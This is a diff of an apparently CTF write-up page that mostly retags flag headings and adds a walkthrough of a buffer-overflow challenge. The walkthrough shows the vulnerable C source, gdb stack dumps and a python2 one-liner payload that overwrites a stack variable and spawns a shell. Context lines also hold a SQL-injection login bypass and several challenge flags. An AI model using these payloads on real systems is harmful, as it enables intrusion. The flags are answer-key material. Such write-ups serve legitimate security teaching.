@@ -118,7 +118,7 @@ password=1' or '1' = '1
 Found. Redirecting to /?alert=flag%7Bsqli_overused_again_0b4f6%7D
 <span class="hljs-comment">#flag{sqli_overused_again_0b4f6}</span>
 </div></code></pre>
-<h4 id="flag-flagsqli_overused_again_0b4f6">Flag: flag{sqli_overused_again_0b4f6}</h4>
+<h5 id="flag-flagsqli_overused_again_0b4f6">Flag: flag{sqli_overused_again_0b4f6}</h5>
 <h3 id="websecure">web/secure</h3>
 <hr>
 <h4 id="categeory-web-1">Categeory: Web</h4>
@@ -228,7 +228,7 @@ db.exec(<span class="hljs-string">`INSERT INTO users (username, password) VALUES
 Found. Redirecting to /?message=flag%7B50m37h1n6_50m37h1n6_cl13n7_n07_600d%7D
 <span class="hljs-comment">#flag{50m37h1n6_50m37h1n6_cl13n7_n07_600d}</span>
 </div></code></pre>
-<h4 id="flag-flag50m37h1n6_50m37h1n6_cl13n7_n07_600d">Flag: flag{50m37h1n6_50m37h1n6_cl13n7_n07_600d}</h4>
+<h5 id="flag-flag50m37h1n6_50m37h1n6_cl13n7_n07_600d">Flag: flag{50m37h1n6_50m37h1n6_cl13n7_n07_600d}</h5>
 <h3 id="webpastebin-1">web/pastebin-1</h3>
 <hr>
 <h4 id="categeory-web-2">Categeory: Web</h4>
@@ -280,7 +280,132 @@ Host</span>: [REDACTED]:1337
 <ol start="6">
 <li>The cookie is the flag itself, no need to authenticate as admin.</li>
 </ol>
-<h4 id="flag-flagd1dn7_n33d_70_b3_1n_ru57">Flag: flag{d1dn7_n33d_70_b3_1n_ru57}</h4>
+<h5 id="flag-flagd1dn7_n33d_70_b3_1n_ru57">Flag: flag{d1dn7_n33d_70_b3_1n_ru57}</h5>
+<h3 id="pwnbeginner-generic-pwn-number-0">pwn/beginner-generic-pwn-number-0</h3>
+<hr>
+<h4 id="categeory-binary-exploitation">Categeory: Binary Exploitation</h4>
+<h4 id="difficulty-easy-2">Difficulty: Easy</h4>
+<h4 id="keywords-buffer-overflow-binary-exploitation">Keywords: Buffer Overflow, Binary Exploitation</h4>
+<h4 id="author-therealdarkcoder-3">Author: TheRealDarkCoder</h4>
+<h4 id="prompt-3">Prompt:&gt;</h4>
+<pre><code><code><div>rob keeps making me write beginner pwn! i'll show him...
+
+nc mc.ax 31199
+
+</div></code></code></pre>
+<h4 id="overview-3">Overview:&gt;</h4>
+<ol>
+<li>
+<p>We have a running service which we can connect to via netcat which is running a ELF binary. The compiled binary (<code>pwn/beginner-generic-pwn-number-0</code>) and the C source code (<code>beginner-generic-pwn-number-0.c</code>) is provided to us. Upon running the binary the file outputs 3 lines, the first being a random line each time (Taken from an array after an index is randomly generated) and then 2 hardcoded lines. Then the program asks for user input and exits after user input.</p>
+</li>
+<li>
+<p>We take a look at the source code and immidietly find the attack vectors.</p>
+</li>
+</ol>
+<pre><code class="language-c"><div>...
+<span class="hljs-keyword">char</span> heartfelt_message[<span class="hljs-number">32</span>];
+
+...
+
+gets(heartfelt_message);
+
+<span class="hljs-keyword">if</span>(inspirational_message_index == <span class="hljs-number">-1</span>) {
+   system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);
+}
+</div></code></pre>
+<ol start="3">
+<li>This is a classic buffer overflow challenge where depreciated <code>gets()</code> is used to take user input. There seems to be an impossible conditional check which makes a system call to open a shell for us. The value of <code>inspirational_message_index</code> has to be set to <code>-1</code> for the check to pass but the value is hardcoded to be between 0 and 2 above in the source code.</li>
+</ol>
+<pre><code class="language-c"><div><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *inspirational_messages[] = {
+  <span class="hljs-string">&quot;\&quot;𝘭𝘦𝘵𝘴 𝘣𝘳𝘦𝘢𝘬 𝘵𝘩𝘦 𝘵𝘳𝘢𝘥𝘪𝘵𝘪𝘰𝘯 𝘰𝘧 𝘭𝘢𝘴𝘵 𝘮𝘪𝘯𝘶𝘵𝘦 𝘤𝘩𝘢𝘭𝘭 𝘸𝘳𝘪𝘵𝘪𝘯𝘨\&quot;&quot;</span>,
+  <span class="hljs-string">&quot;\&quot;𝘱𝘭𝘦𝘢𝘴𝘦 𝘸𝘳𝘪𝘵𝘦 𝘢 𝘱𝘸𝘯 𝘴𝘰𝘮𝘦𝘵𝘪𝘮𝘦 𝘵𝘩𝘪𝘴 𝘸𝘦𝘦𝘬\&quot;&quot;</span>,
+  <span class="hljs-string">&quot;\&quot;𝘮𝘰𝘳𝘦 𝘵𝘩𝘢𝘯 1 𝘸𝘦𝘦𝘬 𝘣𝘦𝘧𝘰𝘳𝘦 𝘵𝘩𝘦 𝘤𝘰𝘮𝘱𝘦𝘵𝘪𝘵𝘪𝘰𝘯\&quot;&quot;</span>,
+};
+
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span>
+</span>{
+  srand(time(<span class="hljs-number">0</span>));
+  <span class="hljs-keyword">long</span> inspirational_message_index = rand() % (<span class="hljs-keyword">sizeof</span>(inspirational_messages) / <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">char</span> *));
+  ...
+</div></code></pre>
+<ol start="4">
+<li>We run the binary with <code>gdb</code> and take a look at the assembly code.</li>
+</ol>
+<pre><code class="language-asm"><code><div>  ...
+   0x0000000000401294 &lt;+158&gt;:	call   0x4010a0 &lt;puts@plt&gt;
+   0x0000000000401299 &lt;+163&gt;:	lea    rax,[rbp-0x30]
+   0x000000000040129d &lt;+167&gt;:	mov    rdi,rax
+   0x00000000004012a0 &lt;+170&gt;:	call   0x4010f0 &lt;gets@plt&gt;
+   0x00000000004012a5 &lt;+175&gt;:	cmp    QWORD PTR [rbp-0x8],0xffffffffffffffff
+   0x00000000004012aa &lt;+180&gt;:	jne    0x4012b8 &lt;main+194&gt;
+   0x00000000004012ac &lt;+182&gt;:	lea    rdi,[rip+0xf35]        # 0x4021e8
+   0x00000000004012b3 &lt;+189&gt;:	call   0x4010c0 &lt;system@plt&gt;
+   0x00000000004012b8 &lt;+194&gt;:	mov    eax,0x0
+   0x00000000004012bd &lt;+199&gt;:	leave  
+   0x00000000004012be &lt;+200&gt;:	ret
+</div></code></code></pre>
+<p>The above is a small ending part of <code>main</code> which we are interested in. We see that after the program outputs the 3 lines (<code>puts()</code>) the <code>main</code> calls a <code>gets()</code>. After which the pointer at <code>[rbp-0x8]</code> is compared with <code>0xffffffffffffffff</code> which is the hexadecimal of <code>-1</code>. So we can assume that <code>rbp-0x8</code> contains the address in stack which stores the random value generated at the top. If the check passes (Which naturally won't because <code>rand()</code> is hardcoding the value to be between 0 and 2) the binary runs a <code>system()</code> call to run a shell. So our target is to overflow the stack to replace the pointer stored at rbp-0x8 with <code>0xffffffffffffffff</code>.</p>
+<ol start="5">
+<li>We set a breakpoint just before the comparison at <code>0x00000000004012a5</code>.</li>
+</ol>
+<pre><code class="language-sh"><div><span class="hljs-built_in">break</span> *0x00000000004012a5
+</div></code></pre>
+<p>Then we run the program with a test input <code>AABBCCDD</code> and reach the breakpoint and take a look at all the registers and some stack.</p>
+<pre><code class="language-asm"><code><div>AABBCCDD
+
+Breakpoint 1, 0x00000000004012a5 in main ()
+(gdb) x/wx $rbp-0x8
+0x7fffffffe368:	0x00000001
+(gdb) x/24wx $rbp
+0x7fffffffe370:	0x00000000	0x00000000	0xf7e0fb25	0x00007fff
+0x7fffffffe380:	0xffffe468	0x00007fff	0x00000064	0x00000001
+0x7fffffffe390:	0x004011f6	0x00000000	0x00001000	0x00000000
+0x7fffffffe3a0:	0x004012c0	0x00000000	0x55f78315	0x62ec878e
+0x7fffffffe3b0:	0x00401110	0x00000000	0x00000000	0x00000000
+0x7fffffffe3c0:	0x00000000	0x00000000	0x00000000	0x00000000
+(gdb) x/24wx $rsp
+0x7fffffffe340:	0x42424141	0x44444343	0x00401200	0x00000000
+0x7fffffffe350:	0x00000000	0x00000000	0x00401110	0x00000000
+0x7fffffffe360:	0xffffe460	0x00007fff	0x00000001	0x00000000
+0x7fffffffe370:	0x00000000	0x00000000	0xf7e0fb25	0x00007fff
+0x7fffffffe380:	0xffffe468	0x00007fff	0x00000064	0x00000001
+0x7fffffffe390:	0x004011f6	0x00000000	0x00001000	0x00000000
+</div></code></code></pre>
+<p>We see that our user input is at <code>0x7fffffffe340</code> and the $rbp-0x8 is at <code>0x7fffffffe368</code>. Subtract the former from the later and we get <code>40</code>. So we need exactly <code>40</code> bytes of userinput to overflow the stack and reach the address where the value of <code>inspirational_message_index</code> is kept. We use python to provide the binary with 40 <code>A</code>s and recheck the stack.</p>
+<pre><code><code><div>0x7fffffffe340:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7fffffffe350:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7fffffffe360:	0x41414141	0x41414141	0x00000000	0x00000000
+</div></code></code></pre>
+<p>And indeed we have reached out target.</p>
+<ol start="6">
+<li>Now we just need to fill the next 8 bytes with hexadecimals <code>ff</code>s.
+I chose to use python2 here because python3 has some weird print directly as binary problems which I still don't understand. I'm sure it can be done with python3 with very simple syntax change but I did in Python2 anyway.</li>
+</ol>
+<pre><code class="language-sh"><div>r &lt;&lt;&lt; $(python2 -c <span class="hljs-string">&quot;print(b&#x27;A&#x27;*40 + b&#x27;\xff&#x27;*8)&quot;</span>)
+...
+0x7fffffffe340:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7fffffffe350:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7fffffffe360:	0x41414141	0x41414141	0xffffffff	0xffffffff
+</div></code></pre>
+<p>...and sure enough, our target addresses are now filled with <code>ff</code>s, which should allow the <code>jne</code> to pass and call the systemcall. <code>gdb</code> says</p>
+<pre><code><code><div>(gdb) c
+Continuing.
+[Detaching after vfork from child process 12200]
+[Inferior 1 (process 12156) exited normally]
+</div></code></code></pre>
+<p>...which means a system call has spawned in another process, in this case the shell. We try to run the python snippet on the actual binary</p>
+<pre><code class="language-sh"><div>(python2 -c <span class="hljs-string">&quot;print(b&#x27;A&#x27;*40 + b&#x27;\xff&#x27;*8)&quot;</span> ; cat) | ./beginner-generic-pwn-number-0
+</div></code></pre>
+<p><em>You have to wrap the line with parenthesis and then do this semicolon <code>cat</code> trick to get output from the shell. There are other cleaner ways to redirect the output from shell but this method works and is simple to remember.</em></p>
+<pre><code><code><div>darkcoder:SOLVED_beginner-generic-pwn-number-0/ (pwn*) $ (python2 -c &quot;print(b'A'*40 + b'\xff'*8)&quot; ; cat) | ./beginner-generic-pwn-number-0
+&quot;𝘱𝘭𝘦𝘢𝘴𝘦 𝘸𝘳𝘪𝘵𝘦 𝘢 𝘱𝘸𝘯 𝘴𝘰𝘮𝘦𝘵𝘪𝘮𝘦 𝘵𝘩𝘪𝘴 𝘸𝘦𝘦𝘬&quot;
+rob inc has had some serious layoffs lately and i have to do all the beginner pwn all my self!
+can you write me a heartfelt message to cheer me up? :(
+whoami
+darkcoder
+</div></code></code></pre>
+<p>...and indeed we have a shell. Pass it to the remote server, run <code>ls; cat flag.txt</code> and the flag is ours.</p>
+<h5 id="flag-flagim-feeling-a-lot-better-but-rob-still-doesnt-pay-me">Flag: flag{im-feeling-a-lot-better-but-rob-still-doesnt-pay-me}</h5>
 
     </body>
     </html>
